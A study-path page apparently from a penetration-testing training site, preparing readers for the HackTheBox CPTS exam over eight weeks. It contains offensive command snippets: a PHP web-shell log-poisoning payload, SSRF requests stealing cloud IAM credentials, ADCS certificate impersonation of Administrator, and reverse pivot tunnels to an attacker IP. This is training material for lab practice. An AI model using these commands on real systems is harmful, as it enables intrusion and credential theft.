---
layout: training-page
title: "HTB CPTS Preparation Path — Red Team Academy"
module: "Learning Paths"
tags:
  - htb
  - cpts
  - hackthebox
  - learning-path
  - oscp-alternative
page_key: "learning-paths-htb-cpts-prep"
render_with_liquid: false
---

# HTB CPTS Preparation Path — 6 to 8 Weeks

The HackTheBox Certified Penetration Testing Specialist (CPTS) is, as of 2026, the most rigorous practical pentesting certification at the OSCP tier — and many practitioners now consider it more technically demanding than OSCP itself. The exam is a full 10-day engagement against a multi-host enterprise network, scored on report quality, and pulls from the entire HTB Academy "Penetration Tester" job-role path.

This path assumes you have either OSCP-level fundamentals or have completed the equivalent HTB Academy Tier 0/1 modules. It is not a beginner path. If you have never rooted a machine on your own, do the [OSCP Prep](/learning-paths/oscp-prep) path first, then come back here.

---

## CPTS Exam Overview

| Parameter | Detail |
|---|---|
| Duration | 10 days active engagement + 4 days report writing |
| Environment | Pro-Lab-style enterprise network — multiple hosts, AD, web, internal services |
| Scoring | 12 flags + professional commercial-grade report |
| Pass threshold | 85% (≥10/12 flags) plus an acceptable report |
| Allowed tools | Any (Metasploit allowed, but discouraged — the exam is built for manual exploitation) |
| Retake | One free retake included |
| Report format | Commercial-grade professional report, judged on technical accuracy and client-readiness |
| Prerequisites recommended | OSCP-equivalent foundation; ideally a few HTB Pro Lab completions |

The exam is structured as a real-world engagement narrative, not a pile of independent boxes. You move from external recon to an initial foothold, pivot through internal segments, escalate within Active Directory, and capture flags along the way that prove specific compromise milestones. The report is what passes or fails you — flags alone are not enough.

---

## Prerequisites Checklist

Before starting week 1, confirm you can:
- [ ] Root a "Medium" HackTheBox machine without a walkthrough
- [ ] Read and modify a Python exploit script
- [ ] Run a full Nmap scan and explain every flag you used
- [ ] Use Burp Suite to intercept, modify, and replay HTTP requests
- [ ] Stand up Linux, Windows, and a small AD lab
- [ ] Stabilize a reverse shell to a fully interactive PTY
- [ ] Pivot through a SOCKS proxy with Chisel or Ligolo-ng

If any of those is uncertain, the CPTS path is too advanced — go back to OSCP fundamentals.

---

## Week 1: Information Gathering and External Recon

**Goal:** Build a complete attack surface picture for a target organization, both passive and active.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Information Gathering — Web Edition | Web fingerprinting, virtual hosts, technology detection |
| Footprinting | Service-by-service enumeration, banner grabbing |
| Network Enumeration with Nmap | Full nmap surface, NSE scripts, output formats |
| Attacking Common Services | FTP, SMB, NFS, MSSQL, MySQL, PostgreSQL, MSRPC initial access |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/recon/passive-recon](/recon/passive-recon) | OSINT, subdomain enumeration, exposed asset discovery |
| [/recon/active-recon](/recon/active-recon) | Nmap workflow, masscan, service version fingerprinting |
| [/recon/network-enum](/recon/network-enum) | SMB, RPC, SNMP, LDAP, NetBIOS deep enumeration |
| [/recon/web-fingerprinting](/recon/web-fingerprinting) | Tech stack identification, virtual host discovery |

### Practice

Stand up a small Windows + Linux lab (3 hosts). Practice each enumeration command until you can produce a full host-by-host enumeration report in under 90 minutes.

```bash
# Full host enumeration workflow
nmap -sC -sV -p- --min-rate 5000 -oA tcp_full <target>
nmap -sU --top-ports 200 -oA udp_top <target>

# Then deep-dive each open port
# Example: SMB
enum4linux-ng -A <target>
crackmapexec smb <target> --shares --users --pass-pol
smbmap -H <target>
nxc smb <target> -u guest -p '' --shares
```

---

## Week 2: Web Attacks — The Foundation

**Goal:** Master the web vulnerability classes that appear most often in HTB Academy and the CPTS exam.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Web Requests | HTTP fundamentals, curl, header manipulation |
| Using Web Proxies | Burp Suite workflow, intercept, repeater, intruder |
| Login Brute Forcing | Web login attacks, hydra against forms |
| SQL Injection Fundamentals | UNION-based, error-based, time-based SQLi |
| Cross-Site Scripting (XSS) | Reflected, stored, DOM-based XSS |
| File Inclusion | LFI, RFI, log poisoning, PHP wrappers |
| File Upload Attacks | Upload validation bypass, polyglot files, double extensions |
| Command Injections | OS command injection, blind injection, filter bypass |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/sql-injection](/web/sql-injection) | Manual SQLi, sqlmap, blind SQLi, file read via SQLi |
| [/web/xss](/web/xss) | Reflected/stored/DOM XSS, payload curation, session theft |
| [/web/file-inclusion](/web/file-inclusion) | LFI, RFI, log poisoning, PHP wrappers, php://filter chain |
| [/web/file-upload](/web/file-upload) | Bypass techniques, double extensions, mime confusion |
| [/web/command-injection](/web/command-injection) | OS command injection, blind variants, filter bypass |
| [/web/auth-bypass](/web/auth-bypass) | Auth flaws, session handling, JWT issues |

### LFI Chain Practice

CPTS frequently chains LFI to RCE. Burn this into muscle memory:

```bash
# php://filter to read source
curl "http://<target>/?file=php://filter/convert.base64-encode/resource=index"

# Log poisoning via User-Agent
curl http://<target>/ -A "<?php system(\$_GET['c']); ?>"
curl "http://<target>/?file=/var/log/apache2/access.log&c=id"

# php_session upload via SESSIONID
curl "http://<target>/?file=/var/lib/php/sessions/sess_<id>"
```

---

## Week 3: Server-Side and Application Logic Attacks

**Goal:** Tackle the harder web bugs — server-side template injection, deserialization, NoSQL injection, GraphQL.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Web Service & API Attacks | REST, GraphQL, API enumeration and abuse |
| SSRF (Server-Side Request Forgery) | Cloud metadata theft, internal port scan via SSRF |
| Insecure Direct Object References | IDOR enumeration, ID prediction |
| Server-Side Includes (SSI) Injection | SSI directive abuse |
| Hacking WordPress | Plugin enumeration, RCE via theme editor |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/ssrf](/web/ssrf) | SSRF fundamentals, blind SSRF, cloud metadata, internal pivots |
| [/web/idor](/web/idor) | Object reference enumeration, role-based access bypass |
| [/web/ssti](/web/ssti) | Template injection across Jinja2, Twig, Velocity, Freemarker |
| [/web/deserialization](/web/deserialization) | Java, .NET, PHP, Python deserialization gadgets |
| [/web/graphql](/web/graphql) | GraphQL introspection, mutation abuse |

### SSRF to Cloud Compromise

```bash
# AWS metadata
curl "http://<target>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://<target>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

# IMDSv2 (newer AWS)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/"

# Azure metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

---

## Week 4: Privilege Escalation — Linux and Windows

**Goal:** Reach SYSTEM/root from a low-privileged shell using at least 10 distinct techniques per OS.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Linux Privilege Escalation | Full Linux privesc tree, SUID, sudo abuse, capabilities |
| Windows Privilege Escalation | Full Windows privesc tree, services, tokens, registry |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/post-exploitation/privesc-linux](/post-exploitation/privesc-linux) | LinPEAS, GTFOBins, SUID, capabilities, cron, kernel exploits |
| [/post-exploitation/privesc-windows](/post-exploitation/privesc-windows) | WinPEAS, services, tokens, unquoted paths, AlwaysInstallElevated |
| [/post-exploitation/token-impersonation](/post-exploitation/token-impersonation) | SeImpersonate, Potato family, PrintSpoofer, GodPotato |
| [/post-exploitation/credential-manager](/post-exploitation/credential-manager) | Windows credential storage, DPAPI, cmdkey, stored RDP creds |

### CPTS Linux Privesc Checklist

```bash
# Run linpeas first, but verify findings manually
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual core checks
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.*
ss -tlnp
uname -r
ls -la /home/*/.ssh/
```

### CPTS Windows Privesc Checklist

```cmd
whoami /priv
whoami /groups
systeminfo
wmic qfe get HotFixID,InstalledOn
.\winPEASx64.exe quiet
.\PowerUp.ps1 ; Invoke-AllChecks
.\Watson.exe
```

---

## Week 5: Active Directory — Enumeration and Initial Compromise

**Goal:** From a domain user foothold, build a complete AD picture and identify the path to Domain Admin.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Active Directory Enumeration & Attacks | Full module — BloodHound, PowerView, kerberoasting, AS-REP, ACL abuse |
| Kerberos Attacks | TGT, TGS, golden ticket, silver ticket, S4U2Self |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/ad-enumeration](/active-directory/ad-enumeration) | BloodHound, SharpHound, PowerView, ldapdomaindump |
| [/active-directory/kerberoasting](/active-directory/kerberoasting) | SPN discovery, hash cracking, service account targeting |
| [/active-directory/as-rep-roasting](/active-directory/as-rep-roasting) | DONT_REQ_PREAUTH abuse, kerbrute, hash format |
| [/active-directory/acl-abuse](/active-directory/acl-abuse) | GenericAll, GenericWrite, WriteDACL, AddMember chains |
| [/active-directory/pass-the-hash](/active-directory/pass-the-hash) | PtH, OverPtH, PtT, ticket relay |

### BloodHound Workflow

```bash
# Collect with SharpHound from a domain-joined Windows
.\SharpHound.exe -c All --zipfilename loot.zip

# Or with bloodhound.py from Linux
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc> -c All --zip

# Load into BloodHound CE
docker run -d --name bloodhound -p 8080:8080 specterops/bloodhound:latest
# Visit http://localhost:8080, drop the zip in
# Mark owned → run pre-built queries
```

### ACL Abuse Quick Reference

| ACL Right | Target Type | Abuse |
|---|---|---|
| GenericAll | User | Reset password, force kerberoast, target ACL |
| GenericAll | Group | Add yourself to the group |
| GenericAll | Computer | Resource-based constrained delegation (RBCD) |
| GenericWrite | User | Set SPN, force kerberoast |
| WriteDACL | Any | Grant yourself GenericAll, then chain |
| WriteOwner | Any | Take ownership, grant yourself GenericAll |
| ForceChangePassword | User | Reset the user's password |
| AddMember | Group | Add yourself to the group |

---

## Week 6: Active Directory — Advanced Attacks and Lateral Movement

**Goal:** Chain ACL abuse, constrained delegation, ADCS, and trust abuse into full domain or forest compromise.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Active Directory — Cross-Forest Attacks | Trust abuse, SID history, foreign privileges |
| Active Directory Certificate Services Attacks | ESC1–ESC8, certificate-based persistence |
| Kerberos Delegation Attacks | Unconstrained, constrained, RBCD chains |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/dcsync](/active-directory/dcsync) | Replicating Directory Changes, secretsdump, NTDS dump |
| [/active-directory/golden-tickets](/active-directory/golden-tickets) | krbtgt forging, persistence after compromise |
| [/active-directory/constrained-delegation](/active-directory/constrained-delegation) | Constrained, unconstrained, RBCD attacks |
| [/active-directory/adcs-attacks](/active-directory/adcs-attacks) | ESC1–ESC11, Certipy, cert-based auth |
| [/active-directory/trust-abuse](/active-directory/trust-abuse) | Forest trust attacks, SID history injection |

### ADCS ESC1 Quickfire

```bash
# Find vulnerable templates
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable

# Request cert as any user
certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -target <ca_host> -template <vuln_template> -upn 'administrator@<domain>'

# Authenticate as Administrator with cert
certipy auth -pfx administrator.pfx
```

### Pivoting and Tunneling

```bash
# Ligolo-ng — preferred for CPTS
# Attacker: 
./proxy -selfcert
# Agent on compromised host:
./agent -connect <attacker_ip>:11601 -ignore-cert
# Then in proxy console:
session 1
start
# Add route on attacker
sudo ip route add <internal_subnet> dev ligolo
```

---

## Week 7: Pivoting, Tunneling, and Multi-Host Compromise

**Goal:** Move between network segments through compromised hosts, expose internal services to your attacker box, and chain pivots through multiple jump hosts.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Pivoting, Tunneling, and Port Forwarding | Chisel, Ligolo-ng, SSH tunnels, sshuttle, SOCKS, dynamic forwarding |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/pivoting/ssh-tunneling](/pivoting/ssh-tunneling) | Local, remote, dynamic forwarding via SSH |
| [/pivoting/chisel](/pivoting/chisel) | Chisel server/client, SOCKS via chisel |
| [/pivoting/ligolo](/pivoting/ligolo) | Ligolo-ng full workflow — preferred tool |
| [/pivoting/proxychains](/pivoting/proxychains) | proxychains4 config, tool routing |

### Chisel SOCKS Pivot

```bash
# Attacker:
./chisel server --reverse --port 8080

# Compromised host:
./chisel client <attacker_ip>:8080 R:1080:socks

# Attacker proxychains config (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Use any tool through the pivot
proxychains4 nmap -sT -Pn -p 445,3389 10.10.20.0/24
proxychains4 impacket-psexec <domain>/<user>@10.10.20.5
```

---

## Week 8: Mock Exam and Report Writing

**Goal:** Run a full 10-day mock engagement, then produce a CPTS-grade report.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Documentation & Reporting | Report structure, executive summary, finding writeup |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/reporting/findings](/reporting/findings) | Finding writeup, severity, evidence, remediation |
| [/reporting/report-templates](/reporting/report-templates) | Full commercial report templates |

### Mock Exam Setup

Pick a Pro Lab — Dante, Offshore, or RastaLabs work well — and treat it as a 10+4 day CPTS exam:

- Days 1–10: Full engagement, no walkthroughs, document everything as you go
- Days 11–14: Write the report

Your mock report should be at least 40 pages and include:

1. Cover page with scope and engagement window
2. Executive summary (one page)
3. Methodology section
4. Attack narrative — chronological story of compromise
5. Findings — each with title, severity, CVSS, affected hosts, evidence, remediation
6. Appendices — full enumeration output, tool versions, in-scope hosts

### Evidence Collection Throughout the Engagement

CPTS rewards documentation discipline. Build the report as you exploit, not after:

```bash
# Recommended folder structure
mkdir -p ~/cpts-exam/{recon,foothold,web,ad,lateral,privesc,evidence,notes,report-drafts}

# For each significant action
# 1. Run the command in a clean terminal with your IP visible
# 2. Take a full-window screenshot
# 3. Save with a name that matches the kill chain phase
# 4. Add a short markdown note explaining what just happened
```

### Report Severity Rubric for CPTS

| Severity | CVSS Range | Criteria |
|---|---|---|
| Critical | 9.0–10.0 | Direct domain compromise, unauthenticated RCE on internet-facing service |
| High | 7.0–8.9 | Significant impact requiring some context, e.g., privesc, exposed creds |
| Medium | 4.0–6.9 | Information disclosure, weak crypto, abuse requiring auth |
| Low | 0.1–3.9 | Best-practice deviations, missing headers, version disclosure |
| Informational | 0.0 | Hardening notes, no direct exploit |

---

## Comparison to OSCP and PNPT

| Dimension | CPTS | OSCP | PNPT |
|---|---|---|---|
| Format | 10-day engagement | 24-hour exam | 5-day engagement |
| Flags vs report weight | Both required, report critical | Flags + report | Compromise + report |
| AD depth | Highest of the three | Medium | High |
| Web depth | Highest of the three | Low–Medium | Low |
| Pivoting/tunneling | Required | Not tested | Light |
| Buffer overflow | None | Required | None |
| Pass bar | ≥85% (10/12 flags) + report | 70 pts | DA + acceptable report |
| Cost | Mid (HTB Academy + exam voucher) | Highest | Lowest |
| Industry recognition | Growing rapidly, strong technical reputation | Most established | Growing |

CPTS is the most technically demanding of the three. Treat it as a "harder OSCP" rather than an entry cert.

---

## Additional Resources

| Resource | Type | Cost |
|---|---|---|
| HTB Academy Penetration Tester path | Full job-role path, official CPTS curriculum | Paid (cubes/subscription) |
| HTB Pro Labs (Dante, Offshore, RastaLabs) | Live multi-host labs | Paid subscription |
| HTB retired machines | Practice machines | Paid subscription |
| Ippsec YouTube | HTB walkthroughs | Free |
| The Hacker Recipes | AD attack reference | Free |
| Certipy GitHub | ADCS attack tooling | Free |
| Ligolo-ng GitHub | Modern pivoting tool | Free |
